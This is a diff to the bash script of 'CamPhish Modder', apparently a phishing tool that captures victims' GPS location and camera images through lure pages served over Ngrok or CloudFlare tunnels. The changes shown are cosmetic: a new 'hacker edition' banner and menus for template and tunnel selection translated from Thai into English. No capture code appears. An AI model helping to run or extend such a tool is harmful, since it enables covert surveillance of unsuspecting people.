@@ -47,17 +47,20 @@ trap 'printf "\n"; stop' INT TERM
 
 banner() {
   clear
-  printf "${CYAN}  _______  _______  _______  ${RESET}${MAGENTA}_______          _________ _______          ${RESET}\n"
-  printf "${CYAN} (  ____ \\(  ___  )(       )${RESET}${MAGENTA}(  ____ )|\\     /|\\__   __/(  ____ \\|\\     /|${RESET}\n"
-  printf "${SKY} | (    \\/| (   ) || () () |${RESET}${PINK}| (    )|| )   ( |   ) (   | (    \\/| )   ( |${RESET}\n"
-  printf "${SKY} | |      | (___) || || || |${RESET}${PINK}| (____)|| (___) |   | |   | (_____ | (___) |${RESET}\n"
-  printf "${BLUE} | |      |  ___  || |(_)| |${RESET}${PURPLE}|  _____)|  ___  |   | |   (_____  )|  ___  |${RESET}\n"
-  printf "${BLUE} | |      | (   ) || |   | |${RESET}${PURPLE}| (      | (   ) |   | |         ) || (   ) |${RESET}\n"
-  printf "${GREEN} | (____/\\| )   ( || )   ( |${RESET}${YELLOW}| )      | )   ( |___) (___/\\____) || )   ( |${RESET}\n"
-  printf "${GREEN} (_______/|/     \\||/     \\|${RESET}${YELLOW}|/       |/     \\|\\_______/\\_______)|/     \\|${RESET}\n"
-  printf "\n"
-  printf "  ${BOLD}${PINK}╔═╗${GOLD} CamPhish ${CYAN}Modder ${PINK}╚═╝${RESET}  ${DIM}${GRAY}v3.0 Stable Edition${RESET}\n"
-  printf "  ${GRAY}»${RESET} ${LIME}GPS + Camera capture${RESET} ${GRAY}•${RESET} ${SKY}Ngrok / CloudFlare${RESET} ${GRAY}•${RESET} ${GOLD}Termux / Linux / Win${RESET}\n"
+  printf "${GREEN}${BOLD}"
+  cat <<'BANNER'
+.d8888b.                         8888888b.  888      d8b          888           888b     d888               888      888
+d88P  Y88b                        888   Y88b 888      Y8P          888           8888b   d8888               888      888
+888    888                        888    888 888                   888           88888b.d88888               888      888
+888         8888b.  88888b.d88b.  888   d88P 88888b.  888 .d8888b  88888b.       888Y88888P888  .d88b.   .d88888  .d88888  .d88b.  888d888
+888            "88b 888 "888 "88b 8888888P"  888 "88b 888 88K      888 "88b      888 Y888P 888 d88""88b d88" 888 d88" 888 d8P  Y8b 888P"
+888    888 .d888888 888  888  888 888        888  888 888 "Y8888b. 888  888      888  Y8P  888 888  888 888  888 888  888 88888888 888
+Y88b  d88P 888  888 888  888  888 888        888  888 888      X88 888  888      888   "   888 Y88..88P Y88b 888 Y88b 888 Y8b.     888
+ "Y8888P"  "Y888888 888  888  888 888        888  888 888  88888P' 888  888      888       888  "Y88P"   "Y88888  "Y88888  "Y8888  888
+BANNER
+  printf "${RESET}\n"
+  printf "  ${GREEN}${BOLD}[+] CamPhish Modder v1${RESET}  ${GREEN}// hacker edition${RESET}\n"
+  printf "  ${GREEN}» GPS + Camera capture • Ngrok / CloudFlare • Termux / Linux / Win${RESET}\n"
   printf "\n"
 }
 
@@ -409,11 +412,11 @@ ngrok_server() {
 
 select_template() {
   while true; do
-    printf "\n${PINK}───${RESET} ${BOLD}${WHITE}เลือก Template${RESET} ${PINK}───${RESET}\n"
-    printf "${GREEN}[${WHITE}01${GREEN}]${RESET} ${GOLD}Festival Wishing${RESET}\n"
-    printf "${GREEN}[${WHITE}02${GREEN}]${RESET} ${GOLD}Live Youtube TV${RESET}\n"
-    printf "${GREEN}[${WHITE}03${GREEN}]${RESET} ${GOLD}Online Meeting${RESET}\n"
-    read -p "$(printf "${GREEN}[${WHITE}+${GREEN}]${RESET} ${WHITE}เลือก template [ค่าเริ่มต้น 1]: ${RESET}")" option_tem
+    printf "\n${GREEN}${BOLD}[+]----[ Choose template ]----[+]\n${RESET}"
+    printf "${GREEN}[${WHITE}01${GREEN}]${RESET} ${GREEN}${BOLD}Festival Wishing${RESET}\n"
+    printf "${GREEN}[${WHITE}02${GREEN}]${RESET} ${GREEN}${BOLD}Live Youtube TV${RESET}\n"
+    printf "${GREEN}[${WHITE}03${GREEN}]${RESET} ${GREEN}${BOLD}Online Meeting${RESET}\n"
+    read -p "$(printf "${GREEN}${BOLD}[+] Choose a template: [Default is 1] > ${RESET}")" option_tem
     option_tem="${option_tem:-1}"
     # ตัดช่องว่างหัวท้าย (ไม่ลบช่องว่างกลางเหมือนของเดิม)
     option_tem=$(printf '%s' "$option_tem" | tr -d '[:space:]')
@@ -449,11 +452,11 @@ select_template() {
 camphish() {
   rm -f sendlink 2>/dev/null
   cleanup_stale
-  printf "\n${PINK}───${RESET} ${BOLD}${WHITE}เลือก Tunnel${RESET} ${PINK}───${RESET}\n"
-  printf "${GREEN}[${WHITE}01${GREEN}]${RESET} ${SKY}Ngrok${RESET}\n"
-  printf "${GREEN}[${WHITE}02${GREEN}]${RESET} ${SKY}CloudFlare Tunnel${RESET}\n"
+  printf "\n${GREEN}${BOLD}[+]----[ Choose tunnel server ]----[+]\n${RESET}"
+  printf "${GREEN}[${WHITE}01${GREEN}]${RESET} ${GREEN}${BOLD}Ngrok${RESET}\n"
+  printf "${GREEN}[${WHITE}02${GREEN}]${RESET} ${GREEN}${BOLD}CloudFlare Tunnel${RESET}\n"
   local option_server
-  read -p "$(printf "${GREEN}[${WHITE}+${GREEN}]${RESET} ${WHITE}เลือก Port Forwarding [ค่าเริ่มต้น 1]: ${RESET}")" option_server
+  read -p "$(printf "${GREEN}${BOLD}[+] Choose a Port Forwarding option: [Default is 1] > ${RESET}")" option_server
   option_server="${option_server:-1}"
   option_server=$(printf '%s' "$option_server" | tr -d '[:space:]')
   select_template
